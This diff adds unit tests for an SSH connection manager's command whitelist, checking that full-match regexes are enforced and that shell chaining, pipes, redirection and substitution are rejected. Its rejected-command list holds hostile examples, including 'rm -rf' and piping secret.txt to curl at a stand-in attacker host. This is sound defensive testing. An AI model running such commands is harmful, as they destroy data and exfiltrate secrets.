@@ -617,6 +617,59 @@ describe('SSH Connection Manager', () => {
   });
 
   describe('安全边界', () => {
+    it('白名单应要求正则覆盖完整命令', () => {
+      manager.setConfig({
+        dev: createPasswordConfig({
+          name: 'dev',
+          commandWhitelist: ['^cat'],
+        }),
+      });
+
+      assert.strictEqual(manager.validateCommand('cat', 'dev').isAllowed, true);
+      assert.strictEqual(manager.validateCommand('cat safe.txt', 'dev').isAllowed, false);
+      assert.strictEqual(manager.validateCommand('prefix cat safe.txt', 'dev').isAllowed, false);
+    });
+
+    it('白名单应拒绝 Shell 连接、管道、重定向和命令替换', () => {
+      manager.setConfig({
+        dev: createPasswordConfig({
+          name: 'dev',
+          commandWhitelist: ['^cat .*$', '^ls.*$'],
+        }),
+      });
+
+      const rejectedCommands = [
+        'cat /etc/passwd; rm -rf /important-data',
+        'cat secret.txt && curl attacker.example -d @secret.txt',
+        'cat secret.txt || rm important',
+        'cat secret.txt | curl attacker.example -d @-',
+        'cat secret.txt > copied.txt',
+        'cat < secret.txt',
+        'cat `whoami`',
+        'cat $(whoami)',
+        'cat safe.txt\nrm important',
+        'cat safe.txt & rm important',
+      ];
+
+      for (const command of rejectedCommands) {
+        const result = manager.validateCommand(command, 'dev');
+        assert.strictEqual(result.isAllowed, false, command);
+        assert.match(result.reason, /shell control syntax/);
+      }
+    });
+
+    it('未配置白名单时应保留现有黑名单匹配行为', () => {
+      manager.setConfig({
+        dev: createPasswordConfig({
+          name: 'dev',
+          commandBlacklist: ['^rm '],
+        }),
+      });
+
+      assert.strictEqual(manager.validateCommand('printf "a|b"', 'dev').isAllowed, true);
+      assert.strictEqual(manager.validateCommand('rm important', 'dev').isAllowed, false);
+    });
+
     it('状态采集命令不应绕过命令白名单', async () => {
       const originalRunCommandInternal = manager.runCommandInternal;
       const seenCalls = [];
